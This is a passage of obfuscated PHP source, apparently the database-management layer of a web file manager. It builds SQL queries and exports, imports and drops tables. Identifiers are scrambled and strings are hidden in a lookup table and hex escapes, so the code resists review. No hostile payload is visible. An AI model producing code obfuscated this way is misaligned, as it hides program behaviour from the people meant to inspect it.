$∑ª¡Ûø¡[1106] . $∏÷”˙ì£ : $∑ª¡Ûø¡[12]; } protected function parseGroup($‚ÿ”Î”®) { $êÿÊÒçË =& $_SERVER[ß⁄ˆÇ†Œ]; return !empty($‚ÿ”Î”®) ? $êÿÊÒçË[1107] . $‚ÿ”Î”® : $êÿÊÒçË[12]; } protected function parseHaving($‹‘ı§‘◊) { $ÚŸÚí◊º =& $_SERVER[ß⁄ˆÇ†Œ]; return !empty($‹‘ı§‘◊) ? $ÚŸÚí◊º[1108] . $‹‘ı§‘◊ : $ÚŸÚí◊º[12]; } protected function parseComment($⁄∫í≤ºÎ) { $ã≥≠äÉπ =& $_SERVER[ß⁄ˆÇ†Œ]; return !empty($⁄∫í≤ºÎ) ? $ã≥≠äÉπ[1109] . $⁄∫í≤ºÎ . $ã≥≠äÉπ[1110] : $ã≥≠äÉπ[12]; } protected function parseDistinct($£Ú∞Ã∂ü) { $—ü◊ü◊› =& $_SERVER[ß⁄ˆÇ†Œ]; return !empty($£Ú∞Ã∂ü) ? $—ü◊ü◊›[1111] : $—ü◊ü◊›[12]; } protected function parseUnion($‰–Ñ·—£) { $˜É«Úìÿ =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($‰–Ñ·—£)) { return $˜É«Úìÿ[12]; } if (isset($‰–Ñ·—£[$˜É«Úìÿ[433]])) { $—È¬àøÅ = $˜É«Úìÿ[1112]; unset($‰–Ñ·—£[$˜É«Úìÿ[433]]); } else { $—È¬àøÅ = $˜É«Úìÿ[1113]; } foreach ($‰–Ñ·—£ as $≥å«â»Á) { $πÃ˚ÑËÿ[] = $—È¬àøÅ . (is_array($≥å«â»Á) ? $this->buildSelectSql($≥å«â»Á) : $≥å«â»Á); } return implode($˜É«Úìÿ[53], $πÃ˚ÑËÿ); } public function insert($òí≥ÔÑù, $»êﬂõ”◊ = array(), $ç‡˝∫¸Ã = false) { $ˆéŸﬁ¢ƒ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÜçπóÎÎ = $≈Îáçïñ = array(); $this->model = $»êﬂõ”◊[$ˆéŸﬁ¢ƒ[367]]; foreach ($òí≥ÔÑù as $üÂ÷ÂÛ => $∂ÆãŒ¨—) { if (is_array($∂ÆãŒ¨—) && $ˆéŸﬁ¢ƒ[382] == $∂ÆãŒ¨—[0]) { $≈Îáçïñ[] = $this->parseKey($üÂ÷ÂÛ); $ÜçπóÎÎ[] = $∂ÆãŒ¨—[1]; } elseif (is_scalar($∂ÆãŒ¨—) || is_null($∂ÆãŒ¨—)) { $≈Îáçïñ[] = $this->parseKey($üÂ÷ÂÛ); $ÜçπóÎÎ[] = $this->parseValue($∂ÆãŒ¨—); } } $»ì˛æÍﬁ = ($ç‡˝∫¸Ã ? $ˆéŸﬁ¢ƒ[981] : $ˆéŸﬁ¢ƒ[982]) . $ˆéŸﬁ¢ƒ[983] . $this->parseTable($»êﬂõ”◊[$ˆéŸﬁ¢ƒ[365]]) . $ˆéŸﬁ¢ƒ[977] . implode($ˆéŸﬁ¢ƒ[50], $≈Îáçïñ) . $ˆéŸﬁ¢ƒ[978] . implode($ˆéŸﬁ¢ƒ[50], $ÜçπóÎÎ) . $ˆéŸﬁ¢ƒ[979]; $»ì˛æÍﬁ .= $this->parseLock(isset($»êﬂõ”◊[$ˆéŸﬁ¢ƒ[917]]) ? $»êﬂõ”◊[$ˆéŸﬁ¢ƒ[917]] : !1); $»ì˛æÍﬁ .= $this->parseComment(!empty($»êﬂõ”◊[$ˆéŸﬁ¢ƒ[439]]) ? $»êﬂõ”◊[$ˆéŸﬁ¢ƒ[439]] : $ˆéŸﬁ¢ƒ[12]); return $this->execute($»ì˛æÍﬁ, $this->parseBind(!empty($»êﬂõ”◊[$ˆéŸﬁ¢ƒ[370]]) ? $»êﬂõ”◊[$ˆéŸﬁ¢ƒ[370]] : array())); } public function selectInsert($Ûõê√€, $ïî£øƒ∆, $î«€ì˘˝ = array()) { $á˜ïÔ›∏ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->model = $î«€ì˘˝[$á˜ïÔ›∏[367]]; if (is_string($Ûõê√€)) { $Ûõê√€ = explode($á˜ïÔ›∏[50], $Ûõê√€); } array_walk($Ûõê√€, array($this, $á˜ïÔ›∏[980])); $áË§ÿûÎ = $á˜ïÔ›∏[1114] . $this->parseTable($ïî£øƒ∆) . $á˜ïÔ›∏[977] . implode($á˜ïÔ›∏[50], $Ûõê√€) . $á˜ïÔ›∏[1092]; $áË§ÿûÎ .= $this->buildSelectSql($î«€ì˘˝); return $this->execute($áË§ÿûÎ, $this->parseBind(!empty($î«€ì˘˝[$á˜ïÔ›∏[370]]) ? $î«€ì˘˝[$á˜ïÔ›∏[370]] : array())); } public function update($“ø±¶…À, $ä†∫ê§Ú) { $áÿ©£ù† =& $_SERVER[ß⁄ˆÇ†Œ]; $this->model = $ä†∫ê§Ú[$áÿ©£ù†[367]]; $∫ƒ˚€À´ = $áÿ©£ù†[1115] . $this->parseTable($ä†∫ê§Ú[$áÿ©£ù†[365]]) . $this->parseSet($“ø±¶…À) . $this->parseWhere(!empty($ä†∫ê§Ú[$áÿ©£ù†[361]]) ? $ä†∫ê§Ú[$áÿ©£ù†[361]] : $áÿ©£ù†[12]) . $this->parseOrder(!empty($ä†∫ê§Ú[$áÿ©£ù†[450]]) ? $ä†∫ê§Ú[$áÿ©£ù†[450]] : $áÿ©£ù†[12]) . $this->parseLimit(!empty($ä†∫ê§Ú[$áÿ©£ù†[377]]) ? $ä†∫ê§Ú[$áÿ©£ù†[377]] : $áÿ©£ù†[12]) . $this->parseLock(isset($ä†∫ê§Ú[$áÿ©£ù†[917]]) ? $ä†∫ê§Ú[$áÿ©£ù†[917]] : !1) . $this->parseComment(!empty($ä†∫ê§Ú[$áÿ©£ù†[439]]) ? $ä†∫ê§Ú[$áÿ©£ù†[439]] : $áÿ©£ù†[12]); return $this->execute($∫ƒ˚€À´, $this->parseBind(!empty($ä†∫ê§Ú[$áÿ©£ù†[370]]) ? $ä†∫ê§Ú[$áÿ©£ù†[370]] : array())); } public function delete($†ÎÎ°¶… = array()) { $∞äÏ—ú• =& $_SERVER[ß⁄ˆÇ†Œ]; $this->model = $†ÎÎ°¶…[$∞äÏ—ú•[367]]; $≥ﬁÿ€Ì = $∞äÏ—ú•[1116] . $this->parseTable($†ÎÎ°¶…[$∞äÏ—ú•[365]]) . $this->parseWhere(!empty($†ÎÎ°¶…[$∞äÏ—ú•[361]]) ? $†ÎÎ°¶…[$∞äÏ—ú•[361]] : $∞äÏ—ú•[12]) . $this->parseOrder(!empty($†ÎÎ°¶…[$∞äÏ—ú•[450]]) ? $†ÎÎ°¶…[$∞äÏ—ú•[450]] : $∞äÏ—ú•[12]) . $this->parseLimit(!empty($†ÎÎ°¶…[$∞äÏ—ú•[377]]) ? $†ÎÎ°¶…[$∞äÏ—ú•[377]] : $∞äÏ—ú•[12]) . $this->parseLock(isset($†ÎÎ°¶…[$∞äÏ—ú•[917]]) ? $†ÎÎ°¶…[$∞äÏ—ú•[917]] : !1) . $this->parseComment(!empty($†ÎÎ°¶…[$∞äÏ—ú•[439]]) ? $†ÎÎ°¶…[$∞äÏ—ú•[439]] : $∞äÏ—ú•[12]); return $this->execute($≥ﬁÿ€Ì, $this->parseBind(!empty($†ÎÎ°¶…[$∞äÏ—ú•[370]]) ? $†ÎÎ°¶…[$∞äÏ—ú•[370]] : array())); } public function select($ÃÅÄ·˘Ó = array()) { $øéß≈≠‘ =& $_SERVER[ß⁄ˆÇ†Œ]; $this->model = $ÃÅÄ·˘Ó[$øéß≈≠‘[367]]; $¨ÉªûÊπ = $this->buildSelectSql($ÃÅÄ·˘Ó); $Á®´Ω¬› = isset($ÃÅÄ·˘Ó[$øéß≈≠‘[434]]) ? $ÃÅÄ·˘Ó[$øéß≈≠‘[434]] : !1; if ($Á®´Ω¬›) { $Â£üÈäˆ = is_string($Á®´Ω¬›[$øéß≈≠‘[97]]) ? $Á®´Ω¬›[$øéß≈≠‘[97]] : $øéß≈≠‘[1117] . md5($¨ÉªûÊπ); $≤Ë£’Ä‘ = think_cache($Â£üÈäˆ, $øéß≈≠‘[12], $Á®´Ω¬›); if (!1 !== $≤Ë£’Ä‘) { return $≤Ë£’Ä‘; } } $Èà‘ëÙç = $this->query($¨ÉªûÊπ, $this->parseBind(!empty($ÃÅÄ·˘Ó[$øéß≈≠‘[370]]) ? $ÃÅÄ·˘Ó[$øéß≈≠‘[370]] : array())); if ($Á®´Ω¬› && !1 !== $Èà‘ëÙç) { think_cache($Â£üÈäˆ, $Èà‘ëÙç, $Á®´Ω¬›); } return $Èà‘ëÙç; } public function buildSelectSql($ï∑÷‚‡… = array()) { $Í¸õµ´Û =& $_SERVER[ß⁄ˆÇ†Œ]; if (isset($ï∑÷‚‡…[$Í¸õµ´Û[438]])) { if (strpos($ï∑÷‚‡…[$Í¸õµ´Û[438]], $Í¸õµ´Û[50])) { list($¥∂ÈÒ÷¨, $˚À»õ€™) = explode($Í¸õµ´Û[50], $ï∑÷‚‡…[$Í¸õµ´Û[438]]); } else { $¥∂ÈÒ÷¨ = $ï∑÷‚‡…[$Í¸õµ´Û[438]]; } $¥∂ÈÒ÷¨ = $¥∂ÈÒ÷¨ ? $¥∂ÈÒ÷¨ : 1; $˚À»õ€™ = isset($˚À»õ€™) ? $˚À»õ€™ : (is_numeric($ï∑÷‚‡…[$Í¸õµ´Û[377]]) ? $ï∑÷‚‡…[$Í¸õµ´Û[377]] : 20); $Òù¢¯á› = $˚À»õ€™ * ((int) $¥∂ÈÒ÷¨ - 1); $ï∑÷‚‡…[$Í¸õµ´Û[377]] = $Òù¢¯á› . $Í¸õµ´Û[50] . $˚À»õ€™; } if (think_config($Í¸õµ´Û[1118])) { $ûéà”Ú” = $Í¸õµ´Û[1119] . md5(serialize($ï∑÷‚‡…)); $å˜ú˛‰≥ = think_cache($ûéà”Ú”); if ($å˜ú˛‰≥) { return $å˜ú˛‰≥; } } $‘˛Æ∫á≠ = $this->parseSql($this->selectSql, $ï∑÷‚‡…); $‘˛Æ∫á≠ .= $this->parseLock(isset($ï∑÷‚‡…[$Í¸õµ´Û[917]]) ? $ï∑÷‚‡…[$Í¸õµ´Û[917]] : !1); if (isset($ûéà”Ú”)) { think_cache($ûéà”Ú”, $‘˛Æ∫á≠); } return $‘˛Æ∫á≠; } public function parseSql($‚®˚œé∞, $ñ¿–◊ì˝ = array()) { $Ûº˛ΩüÙ =& $_SERVER[ß⁄ˆÇ†Œ]; $‚®˚œé∞ = str_replace(array($Ûº˛ΩüÙ[1120], $Ûº˛ΩüÙ[1121], $Ûº˛ΩüÙ[1122], $Ûº˛ΩüÙ[1123], $Ûº˛ΩüÙ[1124], $Ûº˛ΩüÙ[1125], $Ûº˛ΩüÙ[1126], $Ûº˛ΩüÙ[1127], $Ûº˛ΩüÙ[1128], $Ûº˛ΩüÙ[1129], $Ûº˛ΩüÙ[1130]), array($this->parseTable("{$ñ¿–◊ì˝[$Ûº˛ΩüÙ[365]]}"), $this->parseDistinct(isset($ñ¿–◊ì˝[$Ûº˛ΩüÙ[1131]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[1131]] : !1), $this->parseField(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[359]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[359]] : $Ûº˛ΩüÙ[220]), $this->parseJoin(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[368]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[368]] : $Ûº˛ΩüÙ[12]), $this->parseWhere(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[361]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[361]] : $Ûº˛ΩüÙ[12]), $this->parseGroup(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[586]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[586]] : $Ûº˛ΩüÙ[12]), $this->parseHaving(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[1132]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[1132]] : $Ûº˛ΩüÙ[12]), $this->parseOrder(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[450]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[450]] : $Ûº˛ΩüÙ[12]), $this->parseLimit(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[377]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[377]] : $Ûº˛ΩüÙ[12]), $this->parseUnion(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[432]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[432]] : $Ûº˛ΩüÙ[12]), $this->parseComment(!empty($ñ¿–◊ì˝[$Ûº˛ΩüÙ[439]]) ? $ñ¿–◊ì˝[$Ûº˛ΩüÙ[439]] : $Ûº˛ΩüÙ[12])), $‚®˚œé∞); return $‚®˚œé∞; } public function getLastSql($ã»àÍñÂ = '') { return $ã»àÍñÂ ? $this->modelSql[$ã»àÍñÂ] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($—õ⁄øﬁΩ) { return addslashes($—õ⁄øﬁΩ); } public function setModel($ä∫€‘¿£) { $this->model = $ä∫€‘¿£; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÓÒû∞®‰ = array()) { $œ‡™Õ•Å =& $_SERVER[ß⁄ˆÇ†Œ]; if (empty($ÓÒû∞®‰)) { $ÓÒû∞®‰ = $GLOBALS[$œ‡™Õ•Å[6]][$œ‡™Õ•Å[21]]; } $this->database = $ÓÒû∞®‰; } public function model($ Úë„´∏ = '') { return new ModelBase($ Úë„´∏, $_SERVER[ß⁄ˆÇ†Œ][12], $this->database); } public function db($‘¡ïØ∏ç = false) { $Åñ˛î“≠ =& $_SERVER[ß⁄ˆÇ†Œ]; $∞’ûí„≥ = array_change_key_case($this->database); if ($this->dbType() == $Åñ˛î“≠[13] || !$‘¡ïØ∏ç) { return $this->model()->db(); } $–øÔ‚§Á = $∞’ûí„≥[$Åñ˛î“≠[1046]]; $∞’ûí„≥[$Åñ˛î“≠[1046]] = $Åñ˛î“≠[12]; if ($∞’ûí„≥[$Åñ˛î“≠[1041]] == $Åñ˛î“≠[1038]) { $∫À∏≠Ω∆ = $∞’ûí„≥[$Åñ˛î“≠[1047]]; $∞’ûí„≥[$Åñ˛î“≠[1047]] = substr($∫À∏≠Ω∆, 0, strrpos($∫À∏≠Ω∆, $Åñ˛î“≠[1133])); } $this->database = $∞’ûí„≥; $Ìª¢‘∆Í = $this->model()->db(); try { $ß”ÄÏ™Ì = $Ìª¢‘∆Í->execute("\x73\x68\x6f\167\40\144\x61\164\141\x62\x61\x73\145\x73\40\x6c\x69\x6b\145\x20\47{$–øÔ‚§Á}\x27"); } catch (Exception $≤´∏∑∏†) { } if (!$ß”ÄÏ™Ì) { $Ìª¢‘∆Í->execute("\143\162\145\141\x74\145\x20\144\141\x74\141\x62\x61\163\145\40\x60{$–øÔ‚§Á}\140"); } $∞’ûí„≥[$Åñ˛î“≠[1046]] = $–øÔ‚§Á; if ($∞’ûí„≥[$Åñ˛î“≠[1041]] == $Åñ˛î“≠[1038]) { $∞’ûí„≥[$Åñ˛î“≠[1047]] .= $Åñ˛î“≠[1133] . $–øÔ‚§Á; } $this->database = $∞’ûí„≥; $Ìª¢‘∆Í->execute("\165\x73\145\x20\140{$–øÔ‚§Á}\x60"); return $Ìª¢‘∆Í; } public function createTable($ÖÎ¢›ƒΩ, &$˚àı∫áò) { $ÒÒ≥ﬂ˛ﬂ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!IO::exist($ÖÎ¢›ƒΩ)) { ActionCall($ÒÒ≥ﬂ˛ﬂ[1134], !0, 0); show_json(LNG($ÒÒ≥ﬂ˛ﬂ[1135]), !1); } $†ÕèÚü√ = $this->model()->db(); $ê€¥˛ëˆ = sqlSplit(IO::getContent($ÖÎ¢›ƒΩ)); foreach ($ê€¥˛ëˆ as $ê∫Áõ≤Ë) { $Æı…¯∑ = stripos($ê∫Áõ≤Ë, $ÒÒ≥ﬂ˛ﬂ[1136]) === 0; if ($Æı…¯∑) { $˚àı∫áò->task[$ÒÒ≥ﬂ˛ﬂ[1137]] += 1; } $†ÕèÚü√->execute($ê∫Áõ≤Ë); if ($Æı…¯∑) { preg_match($ÒÒ≥ﬂ˛ﬂ[1138], $ê∫Áõ≤Ë, $˝æÉÔ∞Ï); $˚àı∫áò->task[$ÒÒ≥ﬂ˛ﬂ[1139]] = $˝æÉÔ∞Ï[1]; $˚àı∫áò->update(1); } } } public function insertTable($Æ∂‰≥˚Ò, &$Ìê©úäÔ) { $«∑™ÚéÑ =& $_SERVER[ß⁄ˆÇ†Œ]; $÷é÷˝Ø∂ = $this->model()->db(); $»Ñ¢“¡¬ = $ÊíÈÓ∑† ? array($ÊíÈÓ∑†) : $÷é÷˝Ø∂->getTables(); foreach ($Æ∂‰≥˚Ò as $ÈÚ¿›øú) { $ÊíÈÓ∑† = basename($ÈÚ¿›øú, $«∑™ÚéÑ[861]); if (!in_array($ÊíÈÓ∑†, $»Ñ¢“¡¬)) { continue; } $Ìê©úäÔ->task[$«∑™ÚéÑ[1139]] = $ÊíÈÓ∑†; if (get_filesize($ÈÚ¿›øú) == 0) { continue; } $´öö∏˚˚ = $this->sqlToDb($ÈÚ¿›øú, $Ìê©úäÔ); if (!$´öö∏˚˚) { ActionCall($«∑™ÚéÑ[1134], !0, 0); show_json(LNG($«∑™ÚéÑ[1140]) . "\133{$ÊíÈÓ∑†}\135", !1); } } } public function sqlFromDb($Õ¶¿…ä§, $õ∏íŒû≤, &$Ÿà≠èÚ•, $⁄ª¸ Ø¶ = '') { if ($Ÿà≠èÚ•) { $Ÿà≠èÚ•->task[$_SERVER[ß⁄ˆÇ†Œ][1139]] = $Õ¶¿…ä§; } $‰îÉÄŸ“ = $this->model($Õ¶¿…ä§); $⁄Û‡ÆØú = 0; $í∂±Ëè´ = 0; $éÏ≠˚ÿÛ = 10000; $’õ÷çäπ = fopen($õ∏íŒû≤, $_SERVER[ß⁄ˆÇ†Œ][1141]); $±¡îÿï„ = $‰îÉÄŸ“->getPk(); $üìÂßÕ = $‰îÉÄŸ“->getDbFields(); $é¢‰Æ†Ò = $_SERVER[ß⁄ˆÇ†Œ][12]; if ($GLOBALS[$_SERVER[ß⁄ˆÇ†Œ][860]] && in_array($Õ¶¿…ä§, array($_SERVER[ß⁄ˆÇ†Œ][1142], $_SERVER[ß⁄ˆÇ†Œ][1143]))) { $é¢‰Æ†Ò = $Õ¶¿…ä§; } do { $ıÈ®’Ãä = array($±¡îÿï„ => array($_SERVER[ß⁄ˆÇ†Œ][1088], $í∂±Ëè´)); $Õ®≠Ü©û = $‰îÉÄŸ“->where($ıÈ®’Ãä)->field($üìÂßÕ)->order($±¡îÿï„ . $_SERVER[ß⁄ˆÇ†Œ][1144])->limit($éÏ≠˚ÿÛ)->select(); $Õ®≠Ü©û = !empty($Õ®≠Ü©û) ? $Õ®≠Ü©û : array(); if (!($¿Ú˚Ã›Í = count($Õ®≠Ü©û))) { break; } $î∑ö”ìÊ = end($Õ®≠Ü©û); $í∂±Ëè´ = $î∑ö”ìÊ[$±¡îÿï„]; $≠Ä¿—´∏ = array(); foreach ($Õ®≠Ü©û as $È¯Ñ®•¯) { if ($é¢‰Æ†Ò) { if ($Õ¶¿…ä§ == $_SERVER[ß⁄ˆÇ†Œ][1142]) { if ($È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][33]] == $_SERVER[ß⁄ˆÇ†Œ][1145]) { $îÏ∫±˙© = json_decode($È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][459]], !0); if ($îÏ∫±˙©[$_SERVER[ß⁄ˆÇ†Œ][32]] == $GLOBALS[$_SERVER[ß⁄ˆÇ†Œ][860]] && $îÏ∫±˙©[$_SERVER[ß⁄ˆÇ†Œ][823]] != 1) { continue; } } } else { if ($È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][33]] == $_SERVER[ß⁄ˆÇ†Œ][1146] && $È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][97]] == $_SERVER[ß⁄ˆÇ†Œ][855]) { continue; } } } if ($⁄ª¸ Ø¶) { $È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][87]] = "\173\x69\x6f\x3a{$⁄ª¸ Ø¶}\175" . substr($È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][87]], strlen("\x7b\x69\157\x3a{$È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][890]]}\175")); $È¯Ñ®•¯[$_SERVER[ß⁄ˆÇ†Œ][890]] = $⁄ª¸ Ø¶; } $≠Ä¿—´∏[] = $_SERVER[ß⁄ˆÇ†Œ][1147] . $this->sqlEncode($È¯Ñ®•¯) . $_SERVER[ß⁄ˆÇ†Œ][1148]; } $”¿µÃçõ = "\111\x4e\123\x45\x52\124\x20\x49\116\124\x4f\40\x60{$Õ¶¿…ä§}\x60\40\50\140" . implode($_SERVER[ß⁄ˆÇ†Œ][1149], $üìÂßÕ) . $_SERVER[ß⁄ˆÇ†Œ][1150]; fwrite($’õ÷çäπ, $”¿µÃçõ . implode($_SERVER[ß⁄ˆÇ†Œ][1151], $≠Ä¿—´∏) . $_SERVER[ß⁄ˆÇ†Œ][74] . PHP_EOL); $⁄Û‡ÆØú += $¿Ú˚Ã›Í; if ($Ÿà≠èÚ•) { $Ÿà≠èÚ•->update($¿Ú˚Ã›Í); } } while ($éÏ≠˚ÿÛ == $¿Ú˚Ã›Í); fclose($’õ÷çäπ); return $⁄Û‡ÆØú; } public function sqlToDb($Åè°Ê≤’, &$Ê–’¶‚») { $Ï§©õ¥Ô =& $_SERVER[ß⁄ˆÇ†Œ]; $”çÍ¯ﬂä = $this->model()->db(); $œùïÍñ± = @fopen($Åè°Ê≤’, $Ï§©õ¥Ô[1152]); if (!$œùïÍñ±) { return !1; } $¥ØÔ»•ê = 0; $Èπ¥—≥ª = $Ï§©õ¥Ô[12]; $È››µﬁ∑ = array(); $ã¢‹µûñ = $this->dbType(); $»Äªâî« = $ã¢‹µûñ == $Ï§©õ¥Ô[13] ? 500 : 2000; $™»”À∏¿ = basename($Åè°Ê≤’, $Ï§©õ¥Ô[861]); $≈êäööÓ = 0; $Å¶Èª ◊ = 4194304; while (!feof($œùïÍñ±)) { $‚≈˘íòú = trim(fgets($œùïÍñ±)); if (!$‚≈˘íòú) { continue; } $ıœÑÆ‚æ = $this->sqlDecode($‚≈˘íòú, $ã¢‹µûñ, $™»”À∏¿); if (stripos($ıœÑÆ‚æ, $Ï§©õ¥Ô[440]) === 0) { if (!$Èπ¥—≥ª) { $Èπ¥—≥ª = $ıœÑÆ‚æ . $Ï§©õ¥Ô[53]; } continue; } if ($Ê–’¶‚») { $Ê–’¶‚»->task[$Ï§©õ¥Ô[1137]] += 1; } $¥ØÔ»•ê++; $È››µﬁ∑[] = rtrim(rtrim(trim($ıœÑÆ‚æ), $Ï§©õ¥Ô[50]), $Ï§©õ¥Ô[74]); $üﬂ∫ÚÉ€ = null; $¶ÏÎ¬Áâ = strlen($ıœÑÆ‚æ); $≈êäööÓ += $¶ÏÎ¬Áâ; $Ù¯Ô˛»˙ = strlen($Èπ¥—≥ª) + $≈êäööÓ + (count($È››µﬁ∑) - 1); if ($Ù¯Ô˛»˙ >= $Å¶Èª ◊) { $üﬂ∫ÚÉ€ = array_pop($È››µﬁ∑); if ($¥ØÔ»•ê > 1) { $¥ØÔ»•ê--; } } if ($¥ØÔ»•ê >= $»Äªâî« || $üﬂ∫ÚÉ€) { $ıœÑÆ‚æ = $Èπ¥—≥ª . implode($Ï§©õ¥Ô[50], $È››µﬁ∑); if (!$”çÍ¯ﬂä->execute($ıœÑÆ‚æ)) { return !1; } if ($Ê–’¶‚») { $Ê–’¶‚»->update($¥ØÔ»•ê); } $È››µﬁ∑ = array(); $¥ØÔ»•ê = 0; $≈êäööÓ = 0; if ($üﬂ∫ÚÉ€) { $È››µﬁ∑ = array($üﬂ∫ÚÉ€); $¥ØÔ»•ê = 1; $≈êäööÓ = $¶ÏÎ¬Áâ; } } } fclose($œùïÍñ±); if (!empty($È››µﬁ∑)) { $ıœÑÆ‚æ = $Èπ¥—≥ª . implode($Ï§©õ¥Ô[50], $È››µﬁ∑); if (!$”çÍ¯ﬂä->execute($ıœÑÆ‚æ)) { return !1; } if ($Ê–’¶‚») { $Ê–’¶‚»->update($¥ØÔ»•ê); } } return !0; } public function dropTable($Èå±—÷Ü = null) { $ôñâ˘¯Í = $this->model()->db(); $∂óÊ‚ï⁄ = $Èå±—÷Ü ? array($Èå±—÷Ü) : $ôñâ˘¯Í->getTables(); if (!$∂óÊ‚ï⁄) { return; } foreach ($∂óÊ‚ï⁄ as $Èå±—÷Ü) { if ($Èå±—÷Ü) { $Èå±—÷Ü = strtolower($Èå±—÷Ü); } else { continue; } $ôñâ˘¯Í->execute("\144\x72\157\160\x20\164\141\142\154\x65\x20\151\x66\40\145\x78\151\x73\164\x73\x20\140{$Èå±—÷Ü}\140"); } } private function sqlEncode($◊Íî∂“Ç) { $±ßÄ√ÁÆ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÃÕ≤÷Êæ = array(); foreach ($◊Íî∂“Ç as $¸„ª‚éΩ) { if (is_array($¸„ª‚éΩ)) { $¸„ª‚éΩ = json_encode_force($¸„ª‚éΩ); } $¸„ª‚éΩ = addslashes($¸„ª‚éΩ); $¸„ª‚éΩ = str_replace(array($±ßÄ√ÁÆ[1153], $±ßÄ√ÁÆ[262], $±ßÄ√ÁÆ[427]), array($±ßÄ√ÁÆ[1154], $±ßÄ√ÁÆ[1155], $±ßÄ√ÁÆ[1156]), $¸„ª‚éΩ); $ÃÕ≤÷Êæ[] = $¸„ª‚éΩ; } return $±ßÄ√ÁÆ[58] . implode($±ßÄ√ÁÆ[1157], $ÃÕ≤÷Êæ) . $±ßÄ√ÁÆ[58]; } private function sqlDecode($˛≤ïåÖÂ, $äëÊõ¡“, $èÑ∞ùÒ≤ = '') { $üù√å∞¬ =& $_SERVER[ß⁄ˆÇ†Œ]; $˛≤ïåÖÂ = str_replace(array($üù√å∞¬[1154], $üù√å∞¬[1155], $üù√å∞¬[1156]), array($üù√å∞¬[1153], $üù√å∞¬[262], $üù√å∞¬[427]), $˛≤ïåÖÂ); if ($äëÊõ¡“ == $üù√å∞¬[13]) { $˛≤ïåÖÂ = str_ireplace($üù√å∞¬[1158], $üù√å∞¬[59], $˛≤ïåÖÂ); $˛≤ïåÖÂ = stripslashes($˛≤ïåÖÂ); } return preg_replace($üù√å∞¬[1159], $üù√å∞¬[12], $˛≤ïåÖÂ); if ($äëÊõ¡“ == $üù√å∞¬[13]) { return $èÑ∞ùÒ≤ != $üù√å∞¬[1160] ? stripslashes($˛≤ïåÖÂ) : $˛≤ïåÖÂ; } if ($èÑ∞ùÒ≤ == $üù√å∞¬[1160]) { $˛≤ïåÖÂ = str_replace($üù√å∞¬[1161], $üù√å∞¬[121], stripslashes($˛≤ïåÖÂ)); } return $˛≤ïåÖÂ; } public function getSqlFile($æ≤Óÿ·Ó = '') { $›è‘ﬂ–– =& $_SERVER[ß⁄ˆÇ†Œ]; $€¢ˆßÁé = $this->dbType(!0); $›≈¡÷ºΩ = CONTROLLER_DIR . "\x69\156\x73\164\141\x6c\154\x2f\x64\x61\164\141\57{$€¢ˆßÁé}\x2e\x73\x71\x6c"; $Ä‹º∞ª≠ = file_get_contents($›≈¡÷ºΩ); $ºË‰èÀŒ = $›è‘ﬂ––[1162] . ($€¢ˆßÁé == $›è‘ﬂ––[877] ? $›è‘ﬂ––[1163] : $›è‘ﬂ––[1164]) . $›è‘ﬂ––[1165]; preg_match_all($ºË‰èÀŒ, $Ä‹º∞ª≠, $ÏÇøŒÂà); $ ê”Åıø = $ÏÇøŒÂà[1]; $∑⁄ó¿ø• = $this->model()->db(); $√Ò€Ó˝Æ = $∑⁄ó¿ø•->getTables(); $ΩúÂ≥¿≠ = TEMP_FILES . $›è‘ﬂ––[1166] . date($›è‘ﬂ––[272]) . $›è‘ﬂ––[8]; del_dir($ΩúÂ≥¿≠); mk_dir($ΩúÂ≥¿≠); $Î“‡óùá = $ΩúÂ≥¿≠ . $›è‘ﬂ––[1167]; $Ãª¸Ôëé = $ΩúÂ≥¿≠ . $›è‘ﬂ––[1168]; $©ØπÜ˝Ÿ = $€¢ˆßÁé == $›è‘ﬂ––[13] ? $›è‘ﬂ––[877] : $›è‘ﬂ––[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\163\x74\x61\154\154\x2f\x64\x61\x74\x61\57{$©ØπÜ˝Ÿ}\x2e\x73\161\154", $ΩúÂ≥¿≠); @touch($ΩúÂ≥¿≠ . $€¢ˆßÁé . $›è‘ﬂ––[861]); $ïÈ £‹á = fopen($Î“‡óùá, $›è‘ﬂ––[1141]); $√ŒªØ¶„ = fopen($Ãª¸Ôëé, $›è‘ﬂ––[1141]); if ($€¢ˆßÁé == $›è‘ﬂ––[13]) { $√Ò€Ó˝Æ = array_diff($√Ò€Ó˝Æ, array($›è‘ﬂ––[853], $›è‘ﬂ––[854])); $Çà÷≤Üí = array($›è‘ﬂ––[1169], $›è‘ﬂ––[1170], $›è‘ﬂ––[1171]); fwrite($√ŒªØ¶„, implode(PHP_EOL, $Çà÷≤Üí) . PHP_EOL . PHP_EOL); foreach ($√Ò€Ó˝Æ as $ã¿üäàÚ) { 